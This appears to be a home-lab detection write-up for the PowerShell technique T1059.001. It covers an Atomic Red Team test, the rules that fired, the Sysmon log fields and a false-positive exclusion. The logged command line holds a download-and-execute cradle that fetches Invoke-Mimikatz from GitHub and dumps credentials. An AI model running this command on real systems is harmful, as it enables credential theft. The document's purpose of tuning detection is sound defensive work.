# T1059.001 — PowerShell

## What this technique is

Using PowerShell to execute commands, download payloads, and run scripts in memory. A primary execution method for attackers due to its deep access to Windows internals, network capabilities, and ability to run without writing files to disk.

---

## Test run

```
Invoke-AtomicTest T1059.001 -TestNumbers 1
```

PowerShell used to download and execute Invoke-Mimikatz directly from GitHub using IEX and Net.WebClient, targeting credential extraction from LSASS memory.

---

## What fired

**Rule 100004 — level 14**
"Possible Mimikatz Execution via PowerShell"

**Rule 92213 — level 15**
"Executable file dropped in folder commonly used by malware"

---

## Key log fields

```
timestamp:        2026-04-12T22:25:09.454Z
agent:            windowsvm1 (192.168.1.187)
eventID:          1 (Sysmon Process Create)
image:            C:\Windows\System32\cmd.exe
commandLine:      "cmd.exe" /c powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/.../Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
parentImage:      C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
user:             DESKTOP1\Administrator
integrityLevel:   High
hashes:           SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450
rule.id:          100004
rule.level:       14
mitre:            T1003.001, T1059.001

timestamp:        2026-04-12T22:25:10.007Z
eventID:          11 (Sysmon FileCreate)
image:            C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
targetFilename:   C:\Users\Administrator\AppData\Local\Temp\__PSScriptPolicyTest_d0sgmx45.a22.ps1
user:             DESKTOP1\Administrator
rule.id:          92213
rule.level:       15
mitre:            T1105
```

---

## Analysis

Rule 100004 fired correctly and at an appropriate level — this was one of the stronger default detections in the lab. The IEX download cradle combined with Invoke-Mimikatz in the command line is a clear signal and the rule reflected that.

The level 15 alert from rule 92213 is a false positive. The file `__PSScriptPolicyTest_*.ps1` is created by PowerShell itself during script policy evaluation — it is normal behavior, not malware staging. Firing at the highest severity level on this file trains analysts to ignore level 15 alerts. An exclusion for this filename pattern is needed.

---

## Rule status

Rule 100004 is working correctly. Rule 92213 needs a false positive exclusion for `__PSScriptPolicyTest_*.ps1` files dropped by powershell.exe.
